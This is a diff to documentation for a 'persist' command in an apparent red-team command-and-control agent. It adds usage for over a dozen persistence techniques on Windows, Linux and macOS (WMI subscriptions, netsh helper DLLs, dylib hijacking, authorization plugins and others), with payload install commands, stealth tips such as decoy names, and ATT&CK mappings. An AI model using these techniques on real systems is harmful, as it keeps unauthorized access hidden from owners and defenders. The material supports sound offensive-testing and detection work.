@@ -7,13 +7,13 @@ hidden = false
 
 ## Summary
 
-Install or remove persistence mechanisms. Cross-platform: Windows (registry, startup-folder, com-hijack, screensaver, IFEO, winlogon, print-processor, accessibility), Linux (crontab, systemd, shell-profile, ssh-key), macOS (launchagent). All methods support install, remove, and list actions.
+Install or remove persistence mechanisms. Cross-platform: Windows (registry, startup-folder, com-hijack, screensaver, IFEO, winlogon, print-processor, accessibility, active-setup, time-provider, port-monitor, wmi-event, netsh-helper), Linux (crontab, systemd, shell-profile, ssh-key, xdg-autostart), macOS (launchagent, periodic, folder-action, login-item, auth-plugin, dylib-hijack, xpc-service). All methods support install, remove, and list/check actions.
 
 ### Arguments
 
 | Parameter | Type | Required | Default | Description |
 |-----------|------|----------|---------|-------------|
-| method | choose_one | Yes | registry | Persistence method: `registry`, `startup-folder`, `com-hijack`, `screensaver`, `ifeo`, `winlogon`, `print-processor`, `accessibility`, or `list` |
+| method | choose_one | Yes | registry | Persistence method: `registry`, `startup-folder`, `com-hijack`, `screensaver`, `ifeo`, `winlogon`, `print-processor`, `accessibility`, `active-setup`, `time-provider`, `port-monitor`, `wmi-event`, `netsh-helper`, `xdg-autostart`, or `list` |
 | action | choose_one | No | install | `install` to add persistence, `remove` to delete it |
 | name | string | No* | - | Registry value name or startup folder filename (*required for registry, defaults to exe name for startup) |
 | path | string | No | Current agent | Path to executable. Defaults to the running agent binary. |
@@ -163,9 +163,117 @@ persist -method accessibility -action remove -name sethc.exe
 
 {{% notice info %}}Supported targets: sethc.exe (Sticky Keys), utilman.exe (Ease of Access), osk.exe (On-Screen Keyboard), narrator.exe (Narrator), magnify.exe (Magnifier).{{% /notice %}}
 
+### Active Setup Persistence
+
+{{% notice info %}}Windows Only{{% /notice %}}
+
+Register a StubPath command under Active Setup in HKLM. Active Setup runs the StubPath once per user at first logon. Survives profile resets and affects all users. Requires admin.
+
+Install:
+```
+persist -method active-setup -action install -path "C:\Windows\Temp\payload.exe"
+```
+
+Install with custom GUID:
+```
+persist -method active-setup -action install -name "{CUSTOM-GUID}" -path "C:\Windows\Temp\payload.exe"
+```
+
+Remove:
+```
+persist -method active-setup -action remove -name "{A9E1B7F2-3D4C-5E6F-7A8B-9C0D1E2F3A4B}"
+```
+
+### Time Provider Persistence
+
+{{% notice info %}}Windows Only{{% /notice %}}
+
+Register a DLL as a Windows Time Provider. Loaded by the w32time service (svchost.exe) at boot. Very stealthy — time providers are rarely audited. Requires admin.
+
+Install:
+```
+persist -method time-provider -action install -path "C:\Windows\Temp\payload.dll" -name "NtpClientExt"
+```
+
+Remove:
+```
+persist -method time-provider -action remove -name "NtpClientExt"
+```
+
+{{% notice tip %}}Restart w32time to load immediately: `net stop w32time && net start w32time`. The DLL must export `TimeProvGetTimeSysInfo`.{{% /notice %}}
+
+### WMI Event Subscription Persistence
+
+{{% notice info %}}Windows Only{{% /notice %}}
+
+Create a WMI event subscription in `root\subscription` namespace. Creates an `__EventFilter` (trigger), `CommandLineEventConsumer` (payload), and `__FilterToConsumerBinding` (link). Triggers when system uptime reaches 120 seconds after boot. Survives reboots and is often missed by security tools that focus on registry/startup locations.
+
+Install (default name "SystemHealthCheck", polls every 300s):
+```
+persist -method wmi-event -action install -path "C:\Windows\Temp\payload.exe"
+```
+
+Install with custom name and polling interval:
+```
+persist -method wmi-event -action install -name "HealthMonitor" -path "C:\Temp\svc.exe" -timeout 60
+```
+
+Check existing WMI subscriptions:
+```
+persist -method wmi-event -action check
+```
+
+Remove:
+```
+persist -method wmi-event -action remove -name "SystemHealthCheck"
+```
+
+{{% notice warning %}}WMI event subscriptions require admin privileges. Sysmon Event ID 19/20/21 logs WMI subscription creation. Some EDRs specifically monitor `root\subscription` namespace changes.{{% /notice %}}
+
+### Netsh Helper DLL Persistence
+
+{{% notice info %}}Windows Only{{% /notice %}}
+
+Register a DLL as a netsh helper. The DLL loads whenever any `netsh` command runs (common in network troubleshooting and configuration scripts). Requires admin to write to `HKLM\SOFTWARE\Microsoft\NetSh` and copy to System32.
+
+Install:
+```
+persist -method netsh-helper -action install -path "C:\Temp\helper.dll" -name "nshipsec"
+```
+
+Check registered netsh helpers:
+```
+persist -method netsh-helper -action check
+```
+
+Remove:
+```
+persist -method netsh-helper -action remove -name "nshipsec"
+```
+
+{{% notice tip %}}Default helper name "nshipsec" mimics the legitimate IPsec netsh helper. The DLL is copied to System32 and the registry value stores only the filename. Triggers on any `netsh` invocation by any user.{{% /notice %}}
+
+### XDG Autostart Persistence
+
+{{% notice info %}}Linux Only{{% /notice %}}
+
+Create a `.desktop` file in `~/.config/autostart/` that runs at graphical login. Works on GNOME, KDE, XFCE, MATE, and other freedesktop-compliant environments.
+
+Install:
+```
+persist -method xdg-autostart -action install -path "/tmp/agent" -name "my-service"
+```
+
+Remove:
+```
+persist -method xdg-autostart -action remove -name "my-service"
+```
+
+{{% notice tip %}}Default name is "system-update-notifier" — a benign-looking name. The .desktop file is created with NoDisplay=true and Hidden=false for stealth.{{% /notice %}}
+
 ### List Existing Persistence
 
-Enumerate all known persistence entries — registry Run keys (HKCU + HKLM), startup folder, COM hijack entries, IFEO debugger entries, Winlogon helper values, print processors, accessibility binary integrity, and screensaver settings:
+Enumerate all known persistence entries — registry Run keys (HKCU + HKLM), startup folder, COM hijack entries, IFEO debugger entries, Active Setup entries, Winlogon helper values, print processors, accessibility binary integrity, screensaver settings, WMI event subscriptions, netsh helper DLLs, XDG autostart entries:
 ```
 persist -method list
 ```
@@ -250,6 +358,107 @@ persist -method ssh-key -action remove -name "backup-key"
 persist -method list
 ```
 
+### macOS Periodic Script (requires root)
+
+Install a script to `/etc/periodic/daily/`:
+```
+persist -method periodic -action install -path "/tmp/agent" -schedule daily -name 500.update
+```
+
+Remove periodic script:
+```
+persist -method periodic -action remove -name 500.update -schedule daily
+```
+
+### macOS Folder Action
+
+Attach an AppleScript Folder Action that executes when files are added to Downloads:
+```
+persist -method folder-action -action install -path "/tmp/agent" -name updater
+```
+
+Use a custom target folder (pass folder path via `-schedule` parameter):
+```
+persist -method folder-action -action install -path "/tmp/agent" -name updater -schedule /Users/target/Desktop
+```
+
+Remove folder action:
+```
+persist -method folder-action -action remove -name updater
+```
+
+### macOS Login Item
+
+Add a Login Item via System Events (launches on user login, user-level):
+```
+persist -method login-item -action install -path "/tmp/agent" -name "MyHelper"
+```
+
+Remove login item:
+```
+persist -method login-item -action remove -name "MyHelper"
+```
+
+{{% notice tip %}}Login Items are visible in System Preferences > General > Login Items on macOS 13+. May require Accessibility permissions.{{% /notice %}}
+
+### macOS Authorization Plugin (requires root)
+
+Install an authorization plugin bundle in `/Library/Security/SecurityAgentPlugins/` and register it in the authorization database. Executes via SecurityAgent during the login process (T1547.002).
+
+Install:
+```
+persist -method auth-plugin -action install -path "/tmp/agent" -name "FawkesAuth"
+```
+
+Remove (deregisters mechanism and deletes bundle):
+```
+persist -method auth-plugin -action remove -name "FawkesAuth"
+```
+
+{{% notice warning %}}Authorization plugins execute as root during the login flow. Malformed plugins may prevent login. Always test in a lab environment first.{{% /notice %}}
+
+### macOS Dylib Hijacking (T1574.004)
+
+Scan for weak-linked dylib hijack opportunities, then plant a payload dylib at a missing weak dependency path. The host application loads the dylib automatically on next launch.
+
+Scan for hijackable dylibs:
+```
+persist -method dylib-hijack -action scan -path /Applications
+```
+
+Plant a payload dylib at a weak link path (from scan results):
+```
+persist -method dylib-hijack -action install -path /tmp/payload.dylib -name /usr/local/lib/missing.dylib
+```
+
+Remove planted dylib:
+```
+persist -method dylib-hijack -action remove -name /usr/local/lib/missing.dylib
+```
+
+{{% notice info %}}SIP-protected paths (e.g., /System/) cannot be hijacked. Unsigned dylibs may be quarantined by Gatekeeper. Use `scan` to find viable candidates first.{{% /notice %}}
+
+### macOS XPC Service
+
+Register an XPC/Mach service with launchd. Uses `MachServices` key for XPC connection-based activation with `KeepAlive` for automatic restart on crash. Runs as LaunchAgent (user) or LaunchDaemon (root).
+
+Install (user scope):
+```
+persist -method xpc-service -action install -path /tmp/agent -name com.company.helper
+```
+
+Install (system scope, requires root):
+```
+persist -method xpc-service -action install -path /usr/local/bin/svc -name com.company.daemon
+```
+
+Remove:
+```
+persist -method xpc-service -action remove -name com.company.helper
+```
+
+{{% notice tip %}}XPC services appear as standard launchd jobs but with MachServices registration, enabling connection-based activation via `NSXPCConnection` or `xpc_connection_create_mach_service`.{{% /notice %}}
+
 ## MITRE ATT&CK Mapping
 
 - T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
@@ -265,3 +474,14 @@ persist -method list
 - T1547.004 — Boot or Logon Autostart Execution: Winlogon Helper DLL
 - T1547.012 — Boot or Logon Autostart Execution: Print Processors
 - T1546.008 — Event Triggered Execution: Accessibility Features
+- T1547.014 — Boot or Logon Autostart Execution: Active Setup
+- T1547.013 — Boot or Logon Autostart Execution: XDG Autostart Entries
+- T1547.003 — Boot or Logon Autostart Execution: Time Providers
+- T1546 — Event Triggered Execution: Folder Actions (macOS)
+- T1053.003 — Scheduled Task/Job: Periodic Scripts (macOS)
+- T1547.015 — Boot or Logon Autostart Execution: Login Items (macOS)
+- T1547.002 — Boot or Logon Autostart Execution: Authentication Process (macOS Authorization Plugin)
+- T1546.003 — Event Triggered Execution: Windows Management Instrumentation Event Subscription
+- T1546.007 — Event Triggered Execution: Netsh Helper DLL
+- T1574.004 — Hijack Execution Flow: Dylib Hijacking (macOS)
+- T1543.004 — Create or Modify System Process: XPC Service (macOS)
